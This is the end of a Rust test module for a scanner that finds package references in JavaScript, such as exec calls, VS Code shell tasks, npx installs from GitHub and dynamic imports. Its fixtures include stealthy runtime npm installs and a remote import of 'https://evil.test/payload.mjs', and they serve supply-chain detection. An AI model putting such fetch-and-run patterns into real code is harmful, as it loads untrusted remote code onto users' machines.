                function install(){{let command=`npx -y github:example/tool#${{revision}}`,task=new api.Task({{}},1,"setup","x",new api.ShellExecution(command));}}
            "#
            );
            let refs = shell_executions(&source);
            assert_eq!(refs.len(), 1);
            assert_eq!(
                refs[0].locator,
                RefLocator::Purl("pkg:github/example/tool@abcdef0123456789".into())
            );
            assert!(
                source[refs[0].offset.unwrap() as usize..].starts_with("new api.ShellExecution")
            );
            assert!(
                refs[0]
                    .evidence
                    .starts_with("new api.ShellExecution(command)")
            );
        }
    }

    #[test]
    fn unknown_shadowed_written_and_documented_commands_are_not_followed() {
        for source in [
            r#"const api=require('vscode');const rev=unknown;new api.ShellExecution(`npx -y github:o/r#${rev}`);"#,
            r#"const api=require('vscode');const rev='abc';function f(rev){new api.ShellExecution(`npx -y github:o/r#${rev}`)}"#,
            r#"const api=require('vscode');let rev='abc';rev=other;new api.ShellExecution(`npx -y github:o/r#${rev}`);"#,
            r#"const api=require('vscode');const command='npx -y github:o/r#abc';new api.ShellExecution('npm test');"#,
            r#"// const api=require('vscode');new api.ShellExecution('npx -y github:o/r#abc');"#,
            r#"const api='vscode';new api.ShellExecution('npx -y github:o/r#abc');"#,
            r#"const api=require('vscode');function f(api){new api.ShellExecution('npx -y github:o/r#abc')}"#,
        ] {
            assert!(shell_executions(source).is_empty(), "{source}");
        }
    }

    #[test]
    fn renamed_https_and_concatenated_commands_are_followed() {
        let source = r#"const editor=require('vscode');const ref='fedcba';const command='npx --yes https://github.com/elsewhere/renamed#'+ref;new editor.ShellExecution(command);"#;
        assert_eq!(
            shell_executions(source)[0].locator,
            RefLocator::Purl("pkg:github/elsewhere/renamed@fedcba".into())
        );
    }

    /// A name resolves to its innermost enclosing binding: never one in a
    /// sibling block, and a `var` binds in its function however deep the
    /// block it is written in.
    #[test]
    fn names_resolve_through_enclosing_scopes_only() {
        let prelude = "const cp=require('child_process');";
        for (body, want) in [
            (
                "const c='npm i real';{const c='npm i decoy';}cp.execSync(c);",
                "pkg:npm/real",
            ),
            (
                "const c='npm i outer';{{{const c='npm i inner';{{cp.execSync(c);}}}}}",
                "pkg:npm/inner",
            ),
            (
                "function f(){{{{var c='npm i hoisted';}}}cp.execSync(c);}",
                "pkg:npm/hoisted",
            ),
            (
                "const c='npm i real';const g=(c)=>0;try{}catch(c){}cp.execSync(c);",
                "pkg:npm/real",
            ),
        ] {
            assert_eq!(resolved(&format!("{prelude}{body}")), [want], "{body}");
        }
    }

    #[test]
    fn esm_imports_of_child_process_are_followed() {
        for source in [
            "import {exec} from 'node:child_process'; const c='npm i evil'; exec(c);",
            "import {execSync as run} from 'child_process'; const c='npm i evil'; run(c);",
            "import * as cp from 'child_process'; const c='npm i evil'; cp.execSync(c);",
            "import cp from 'node:child_process'; const c='npm i evil'; cp.exec(c);",
            "const {exec} = require('child_process'); const c='npm i evil'; exec(c);",
            "const {execSync: run} = require('child_process'); const c='npm i evil'; run(c);",
        ] {
            assert_eq!(resolved(source), ["pkg:npm/evil"], "{source}");
        }
    }

    #[test]
    fn a_local_name_shadows_an_imported_process_api() {
        for source in [
            "import {exec} from 'child_process'; function f(exec){ exec('npm i evil') }",
            "const {exec} = require('child_process'); function f(exec){ exec('npm i evil') }",
            "const cp = require('child_process'); function f(cp){ cp.exec('npm i evil') }",
        ] {
            assert!(purls(source.as_bytes(), "x.js").is_empty(), "{source}");
        }
        // A local `require` is not the module loader.
        assert!(purls(b"function f(require){ require('evil') }", "x.js").is_empty());
    }

    #[test]
    fn writes_and_declarations_that_could_change_a_name_stop_resolution() {
        let prelude = "const cp=require('child_process');";
        for body in [
            "let c='npm i decoy'; ({c}={c:'npm i evil'}); cp.execSync(c);",
            "let c='npm i decoy'; [c]=['npm i evil']; cp.execSync(c);",
            "let c='npm i decoy'; for (c of ['npm i evil']) {} cp.execSync(c);",
            "let c='npm i decoy'; for (c in o) {} cp.execSync(c);",
            "const c='npm i decoy'; { function c(){} cp.execSync(c); }",
            "const c='npm i decoy'; { class c {} cp.execSync(c); }",
            "const c='npm i decoy'; try {} catch (c) { cp.execSync(c); }",
            "const c='npm i decoy'; with (o) { cp.execSync(c); }",
        ] {
            let source = format!("{prelude}{body}");
            assert!(resolved(&source).is_empty(), "{source}");
        }
        // A loop's `let` binds in the loop, not around it.
        for body in [
            "const c='npm i ok';for (let c=0;c<1;c++){} cp.execSync(c);",
            "const c='npm i ok';for (const c of []){} cp.execSync(c);",
        ] {
            let source = format!("{prelude}{body}");
            assert_eq!(resolved(&source), ["pkg:npm/ok"], "{source}");
        }
    }

    #[test]
    fn imported_process_aliases_and_require_bindings_remain_discoverable() {
        for source in [
            "import { exec as run } from 'node:child_process'; run('npm install real-pkg');",
            "const cp = require('child_process'); cp.exec('npm install real-pkg');",
            "const { exec } = require('child_process'); exec('npm install real-pkg');",
        ] {
            assert_eq!(
                purls(source.as_bytes(), "x.js"),
                ["pkg:npm/real-pkg"],
                "{source}"
            );
        }
    }

    #[test]
    fn regular_expression_exec_is_not_a_process_execution() {
        let found = references_in_bytes(
            b"const regex = /npm/; regex.exec('npm install needed'); /pip/.exec('pip install example');",
            "x.js",
        );
        assert!(!found.references.iter().any(|r| r.kind == RefKind::Command));
    }

    #[test]
    fn recognizes_programmatic_npm_install_in_js() {
        // A third-party install API aliased as `npm` installs an undeclared
        // package at runtime with stealth options. The option keys
        // ("no-save", loglevel:"silent") are not packages.
        let js = b"const { syncApi: npm } = require(\"oubliette\");\n\
            try { require(\"db-dx-connector\"); } catch (e) {\n\
            npm().install(\"db-dx-connector\", { \"no-save\": true, loglevel: \"silent\" });\n\
            }\n";
        let found = purls(js, "index.js");
        assert!(
            found.contains(&"pkg:npm/db-dx-connector".to_owned()),
            "{found:?}"
        );
        assert!(
            !found.iter().any(|p| p.contains("no-save")
                || p.contains("loglevel")
                || p.contains("silent")
                || p == "pkg:npm/true"),
            "{found:?}"
        );
        // The install alone, without the probing `require`, is found too.
        let js = b"const { syncApi: npm } = require(\"oubliette\");\n\
            npm().install(\"db-dx-connector\", { \"no-save\": true, loglevel: \"silent\" });\n";
        let found = references_in_bytes(js, "index.js").references;
        assert!(found.iter().any(|r| r.source == "javascript"
            && r.locator == RefLocator::Purl("pkg:npm/db-dx-connector".into())));
    }

    #[test]
    fn bare_install_method_call_is_not_a_package() {
        let js = b"app.install(myPlugin, { name: \"thing\" });\n\
            router.install(\"feature\");\n";
        assert!(purls(js, "app.js").is_empty());
    }

    #[test]
    fn recognizes_dynamic_import_of_undeclared_package() {
        let js = b"async function load(){\n\
            const m = await import(\"stripe-checkout-helper\");\n\
            const r = await import(\"./local-chunk.js\");\n\
            const f = await import(\"node:fs\");\n\
            return m;\n}\n";
        assert_eq!(purls(js, "loader.mjs"), ["pkg:npm/stripe-checkout-helper"]);
    }

    #[test]
    fn recognizes_remote_dynamic_import_as_url() {
        let found = references_in_bytes(
            b"const evil = await import(\"https://evil.test/payload.mjs\");\n",
            "remote.mjs",
        );
        assert!(
            found
                .references
                .iter()
                .any(|r| r.locator == RefLocator::Url("https://evil.test/payload.mjs".into()))
        );
    }

    #[test]
    fn computed_dynamic_import_yields_no_named_package() {
        let js = b"const name = process.env.MOD;\nconst m = await import(name);\n";
        assert!(purls(js, "computed.mjs").is_empty());
    }

    #[test]
    fn offsets_cite_the_call_where_it_sits() {
        for source in [
            "const opts = { quiet: true };\nrequire('child_process').execSync('npm install left-pad');\n",
            "const label = 'é'; child_process.exec('npm install left-pad');",
        ] {
            let found = references_in_bytes(source.as_bytes(), "x.js").references;
            let reference = found
                .iter()
                .find(|r| r.locator == RefLocator::Purl("pkg:npm/left-pad".into()))
                .unwrap();
            let at = reference.offset.unwrap() as usize;
            assert!(
                source[at..].starts_with("require(") || source[at..].starts_with("child_process"),
                "{source}"
            );
        }
    }

    #[test]
    fn code_variables_in_a_call_are_not_package_names() {
        let js = b"const cp = require('child_process');\n\
            cp.execSync('npm install ' + name);\n";
        assert!(purls(js, "x.js").iter().all(|p| !p.contains("name")));
    }

    #[test]
    fn an_escaped_newline_continues_a_command_string() {
        let js =
            b"const cp=require('child_process');const c='npm install \\\nevil-pkg';cp.execSync(c);";
        assert_eq!(purls(js, "x.js"), ["pkg:npm/evil-pkg"]);
    }

    #[test]
    fn repeated_references_in_templates_cannot_explode_resolution() {
        let fan = |name: &str| format!("${{{name}}}").repeat(2_000);
        let js = format!(
            "const cp=require('child_process');const a='';const b=`{}`;const c=`{}`;const d=`{}`;cp.execSync(d);\
             const ok='npm install still-found';cp.execSync(ok);",
            fan("a"),
            fan("b"),
            fan("c")
        );
        assert!(purls(js.as_bytes(), "x.js").contains(&"pkg:npm/still-found".to_owned()));
    }

    /// PAC calls cited among the most references a file may hold. Each
    /// citation replaces the plain-string hits for its URL; doing that per
    /// call is a pass over every reference per call. The scan alone is timed
    /// (the accumulator is filled directly), since a file large enough to
    /// show the difference would mostly time filefacts' own extraction.
    #[test]
    fn pac_citations_among_many_references_cost_linear_time() {
        let mut js = String::from("const m='pac_script',u='https://x.test/p.pac';\n");
        for _ in 0..20_000 {
            js.push_str("chrome.proxy.settings.set({value:{mode:m,pacScript:{url:u}}});\n");
        }
        let parsed = filefacts::OpenOptions::new()
            .path(std::path::Path::new("x.js"))
            .open(js.as_bytes());
        let mut found = super::super::found::Found::new(&[], Some(&js));
        found.add(Reference::new(
            RefLocator::Url("https://x.test/p.pac".into()),
            RefKind::UrlFetch,
            "string",
            "",
        ));
        for i in 1..super::super::found::MAX_FOUND_REFS - 2_000 {
            found.add(Reference::new(
                RefLocator::Url(format!("https://x.test/{i}")),
                RefKind::UrlFetch,
                "string",
                "",
            ));
        }
        let _ = parsed.source_ast();
        let start = std::time::Instant::now();
        super::scan(&parsed, &mut found);
        let elapsed = start.elapsed();
        assert!(elapsed < std::time::Duration::from_secs(10), "{elapsed:?}");
        let found = found.into_discovery();
        let pac: Vec<_> = found
            .references
            .iter()
            .filter(|r| r.locator == RefLocator::Url("https://x.test/p.pac".into()))
            .collect();
        assert_eq!(pac.len(), 1, "{pac:?}");
        assert_eq!(pac[0].source, super::PAC_URL);
    }
}
